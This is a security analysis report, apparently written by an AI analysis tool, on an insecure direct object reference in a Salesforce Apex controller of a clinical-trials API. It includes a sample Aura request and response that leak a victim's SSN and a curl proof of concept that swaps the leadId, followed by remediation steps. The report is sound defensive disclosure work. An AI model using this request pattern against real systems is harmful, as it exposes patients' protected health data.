# Security Analysis Report
**System:** TrialVault ClinicalOps API (Pharmaceutical / Clinical Trials) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0021 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User / Pattern 10.2 | Parameter escalation — `LeadController.getLeadData` accepts arbitrary `leadId`, exposing cross-user clinical trial subject records |

---

## Finding 1 — Parameter Escalation: Clinical Trial Data Exposed via `leadId` Substitution (CRITICAL)

### Summary
The `LeadController` Apex class on TrialVault ClinicalOps API (`eda7efcf.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Lead records. Per §5.0 Pattern 10.2, the `getLeadData` Aura action is vulnerable to session scope extension via parameter escalation: the attacker substitutes their own `leadId` with a victim's (`001EFCF`) in the request payload, extending their session's access beyond their own records. The controller returns the victim's clinical trial subject data — including SSN and confidential internal notes — without any ownership validation.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://eda7efcf.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker substituting victim leadId):**
```
POST https://eda7efcf.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DEDA7EFCF!AReda7efcf...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DEDA7EFCF!AReda7efcf...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"001EFCF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001EFCF",
        "Name": "Victim Lead Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-97-3761"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no server-side Aura session validation.

The response exposes `SensitiveData__c: "SSN: 000-97-3761"` and `InternalNotes__c` for `OwnerId: "005VICTIM"`. In a pharmaceutical clinical trial platform, Lead records represent trial participants — exposing their identity, health data, and trial enrollment details constitutes a serious HIPAA/GCP violation.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private for Lead bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing check | Root cause |
| §5.0 Pattern 10.2 | Vulnerability | Session scope extension via parameter escalation | Classification |
| HAR descriptor | `c.LeadController.getLeadData` | Aura action | Vulnerable entry point |
| HAR params | `leadId` | `001EFCF` | Escalated parameter — victim's record |
| HAR params | `aura.token` | `undefined` | No Aura validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim — cross-user access confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-97-3761` | Clinical trial subject PII |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Trial internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00DEDA7EFCF!AReda7efcf..."
```

**Step 2 — Escalate via `leadId` substitution (VULNERABLE):**
```bash
curl -s -X POST "https://eda7efcf.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"001EFCF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-97-3761
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:** `public with sharing class LeadController {`
2. **Add ownership SOQL predicate:** `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()`
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security.
4. **Validate `aura.token`:** Reject requests with undefined/invalid Aura token.
5. **Server-defined field allowlist:** Remove client-supplied `fields` parameter.
6. **HIPAA/GCP compliance:** Clinical trial participant data is protected health information (PHI) under HIPAA and subject to GCP (Good Clinical Practice) data integrity requirements — any unauthorized access must be reported as a breach and trial integrity review initiated.
